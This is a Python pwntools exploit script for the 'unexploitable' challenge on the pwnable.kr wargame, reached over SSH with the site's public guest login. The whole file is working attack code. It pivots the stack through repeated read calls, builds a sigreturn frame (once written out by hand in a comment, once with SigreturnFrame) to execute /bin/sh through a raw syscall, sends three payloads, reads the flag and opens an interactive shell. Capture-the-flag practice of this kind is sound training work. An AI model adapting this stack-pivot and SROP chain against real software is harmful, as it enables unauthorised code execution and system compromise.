from pwn import *
import time

context.arch = "amd64"
context.os   = "linux"
context.bits = 64

r = ssh(host="pwnable.kr", user="unexploitable", password="guest", port=2222)

target = "/home/unexploitable/unexploitable"
elf_file = "unexploitable"

elf = ELF(elf_file)
syscall_addr = 0x400560 # syscall
bss_addr = elf.bss()
read_ret = 0x40055b     # do read(0, buf 1295) again
rbp_rebase = bss_addr + 0x10
sh_addr = rbp_rebase + (0x10 + 0x4) * 2 + 0x100
junk = 0xdeadbeef
sh = "/bin/sh\x00"


'''
    Sigreturn Frame
sigFrame  = p64(syscall_addr) + p64(0)  # 0x00: rt_sigreturn, uc_flags
sigFrame += p64(0) * 2                  # 0x10: &uc, uc_stack.ss_sp
sigFrame += p64(0) * 2                  # 0x20: uc_stack.ss_flags, uc_stack.ss_size
sigFrame += p64(0) * 2                  # 0x30: r8, r9
sigFrame += p64(0) * 2                  # 0x40: r10, r11
sigFrame += p64(0) * 2                  # 0x50: r12, r13
sigFrame += p64(0) * 2                  # 0x60: r14, r15
sigFrame += p64(sh_addr) + p64(0)       # 0x70: rdi, rsi
sigFrame += p64(0) * 2                  # 0x80: rbp, rbx
sigFrame += p64(0) + p64(0x3b)          # 0x90: rdx, rax
sigFrame += p64(0) * 2                  # 0xA0: rcx, rsp
sigFrame += p64(syscall_addr) + p64(0)  # 0xB0: rip, eflags
sigFrame += p64(0x33) + p64(0)          # 0xC0: cs/gs/fs, err
sigFrame += p64(0) * 2                  # 0xD0: trapno, oldmask(unused)
sigFrame += p64(0) * 2                  # 0xE0: cr2(segfault addr), &fpstate
sigFrame += p64(0) * 2                  # 0xF0: __reserved, sigmask
'''

sigFrame = SigreturnFrame()
sigFrame.rax = 0x3b
sigFrame.rdi = sh_addr
sigFrame.rip = syscall_addr

payload1  = "A" * 0x10
payload1 += p64(rbp_rebase)
payload1 += p64(read_ret)            # do read(0, buf, 1295) again

payload2  = "B" * 0x10
payload2 += p64(rbp_rebase+0x20)
payload2 += p64(read_ret)            # do read(0, buf, 1295) again
payload2 += p64(junk)                # leave;   old rbp for call read()
payload2 += p64(junk)                # ret;     old rip for call read()
payload2 += p64(junk)                # leave;   old rbp for main()
# payload2 += sigFrame
payload2 += p64(syscall_addr)        # ret;     old rip for main()
payload2 += flat(sigFrame)
payload2 += sh

payload3 = "C" * 0xf        # make sigreturn syscall ==> rax = 0xf

io = r.process(target)
time.sleep(3)

print "[+] Send payload1 success!"
io.send(payload1)
time.sleep(0.1)

print "[+] Send payload2 success!"
io.send(payload2)
time.sleep(0.1)

print "[+] Send payload3 success!"
io.send(payload3)

io.recvrepeat(3)
io.sendline("cat flag")

io.interactive()
io.close()
